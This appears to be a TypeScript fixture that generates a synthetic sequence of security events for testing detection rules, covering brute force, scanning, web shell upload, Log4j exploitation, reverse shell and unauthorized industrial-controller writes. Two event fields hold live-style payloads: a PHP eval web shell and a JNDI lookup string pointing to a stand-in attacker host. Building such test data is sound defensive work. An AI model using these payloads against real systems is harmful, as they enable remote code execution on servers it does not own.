/**
 * 内置攻击场景（确定性事件序列，与 CI 冒烟共用同一份）：
 * 51 条事件覆盖 8 条规则——暴力破解横向移动 / 高频扫描 / WebShell / Log4j /
 * DMZ 反弹 Shell / OT 越权写指令 / 白名单外控制源 / 感染后暴力破解跨源链。
 */
export interface ScenarioEvent {
  ev: Record<string, unknown>;
  ts: number;
}

export function attackScenario(startTsMs = Date.now() - 600_000, stepMs = 12_000): ScenarioEvent[] {
  let ts = startTsMs;
  const ev: Record<string, unknown>[] = [];
  const push = (e: Record<string, unknown>) => {
    ts += stepMs;
    ev.push({ ...e, '@timestamp': new Date(ts).toISOString() });
  };
  for (let i = 0; i < 20; i++)
    push({ event: { category: 'authentication', outcome: 'failure' }, src: { ip: '198.51.100.7' }, dst: { ip: `10.2.85.${100 + (i % 3)}`, asset_id: `dev-powe-${i % 3}` }, user: { name: 'admin' } });
  for (let i = 0; i < 20; i++)
    push({ event: { category: 'network-connection', outcome: 'success' }, src: { ip: '203.0.113.9' }, dst: { ip: `10.2.86.${i}`, asset_id: `dev-gate-${i}` } });
  push({ event: { category: 'web', outcome: 'failure' }, src: { ip: '203.0.113.15' }, dst: { ip: '10.2.85.119' }, http: { request: { method: 'POST', body: { content: '<?php eval($_POST[c]);?>' } } }, url: { path: '/uploads/cmd.php' }, file: { name: 'cmd.php' } });
  push({ event: { category: 'web', outcome: 'failure' }, src: { ip: '203.0.113.20' }, dst: { ip: '10.2.85.120' }, url: { query: 'x=${jndi:ldap://evil.tld/a}' } });
  push({ event: { name: 'reverse_shell', outcome: 'failure' }, src: { ip: '10.233.9.9' }, dst: { ip: '10.2.85.130', asset_id: 'dev-gate-0007', asset: { id: 'dev-gate-0007', labels: { zone: 'dmz' } } } });
  push({ event: { category: 'ics-command', outcome: 'success', action: 'write' }, src: { ip: '10.233.9.66' }, dst: { ip: '10.233.9.2', asset_id: 'dev-plc-0001', asset: { id: 'dev-plc-0001', type: 'plc', security: { command_allowlist: ['scada-master-01'] } } } });
  push({ event: { category: 'endpoint', name: 'virus_detect', outcome: 'detected' }, src: { ip: '10.233.71.108', asset_id: 'dev-gate-0042' } });
  for (let i = 0; i < 6; i++)
    push({ event: { category: 'authentication', outcome: 'failure' }, src: { ip: '10.233.71.108', asset_id: 'dev-gate-0042' }, dst: { ip: '10.2.88.50', asset_id: 'dev-gate-0099' } });
  return ev.map((e, i) => ({ ev: e, ts: startTsMs + i * stepMs }));
}
